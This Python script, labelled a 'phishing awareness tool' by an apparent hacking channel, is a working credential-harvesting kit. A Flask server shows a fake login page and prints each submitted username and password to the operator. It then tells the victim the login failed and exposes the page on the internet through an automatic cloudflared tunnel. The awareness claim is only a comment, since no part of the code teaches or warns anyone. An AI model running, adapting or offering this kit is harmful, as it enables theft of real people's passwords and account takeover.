#!/usr/bin/env python3
"""
HCO Phishing Awareness Tool
By Azhar (Hackers Colony)
For Cybersecurity Labs / Awareness Only
"""

import os
import time
import subprocess
import threading
from flask import Flask, request, render_template_string

# ─────────────────────────────
# Colored text helpers
# ─────────────────────────────
RED = "\033[91m"
GREEN = "\033[92m"
CYAN = "\033[96m"
RESET = "\033[0m"
BOLD = "\033[1m"

# ─────────────────────────────
# Templates
# ─────────────────────────────
# Fake login template (awareness only)
LOGIN_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
  <title>Secure Login</title>
  <style>
    body {font-family: Arial, sans-serif; background: #f5f5f5; display: flex; justify-content: center; align-items: center; height: 100vh;}
    .box {background: white; padding: 30px; border-radius: 10px; box-shadow: 0px 0px 10px rgba(0,0,0,0.3);}
    input {display: block; margin: 10px 0; padding: 10px; width: 250px;}
    button {background: #c00; color: white; border: none; padding: 10px; width: 100%; border-radius: 5px;}
  </style>
</head>
<body>
  <div class="box">
    <h2>Login</h2>
    <form method="POST">
      <input type="text" name="username" placeholder="Enter username" required>
      <input type="password" name="password" placeholder="Enter password" required>
      <button type="submit">Login</button>
    </form>
  </div>
</body>
</html>
"""

# ─────────────────────────────
# Flask app
# ─────────────────────────────
app = Flask(__name__)
captured_data = []

@app.route("/", methods=["GET", "POST"])
def index():
    global captured_data
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        data = {"username": username, "password": password}
        captured_data.append(data)
        print(f"\n{GREEN}[+] Captured → {CYAN}Username: {username} | Password: {password}{RESET}")
        return "<h3>Login Failed. Please try again.</h3>"
    return render_template_string(LOGIN_TEMPLATE)

# ─────────────────────────────
# Start Flask server
# ─────────────────────────────
def run_server():
    app.run(host="0.0.0.0", port=5000, debug=False)

# ─────────────────────────────
# Auto cloudflared tunnel
# ─────────────────────────────
def start_cloudflare():
    print(f"\n{CYAN}[~] Starting Cloudflare Tunnel...{RESET}")
    try:
        result = subprocess.Popen(
            ["cloudflared", "tunnel", "--url", "http://127.0.0.1:5000"],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True
        )
        for line in result.stdout:
            if "trycloudflare.com" in line:
                url = line.split(" ")[-1].strip()
                print(f"\n{GREEN}[+] Public Link: {BOLD}{url}{RESET}")
    except FileNotFoundError:
        print(f"{RED}[!] Cloudflared not found. Installing...{RESET}")
        os.system("pkg install cloudflared -y")
        start_cloudflare()

# ─────────────────────────────
# Banner + Flow
# ─────────────────────────────
def banner():
    print(f"\n{RED}{BOLD}═══════════════════════════════════════")
    print(f"        HCO Phishing by Azhar")
    print(f"═══════════════════════════════════════{RESET}\n")

def main():
    banner()
    print(f"{CYAN}[~] Installing required packages...{RESET}")
    os.system("pip install flask requests > /dev/null 2>&1")

    print(f"{CYAN}[~] Redirecting to YouTube for awareness...{RESET}")
    for i in range(5,0,-1):
        print(f"{GREEN}Redirecting in {i}...{RESET}")
        time.sleep(1)
    os.system("xdg-open https://youtube.com/@hackers_colony_tech")

    # Start Flask server thread
    threading.Thread(target=run_server, daemon=True).start()
    time.sleep(2)

    # Start cloudflare tunnel
    start_cloudflare()

    # Keep script alive
    while True:
        time.sleep(1)

if __name__ == "__main__":
    main()
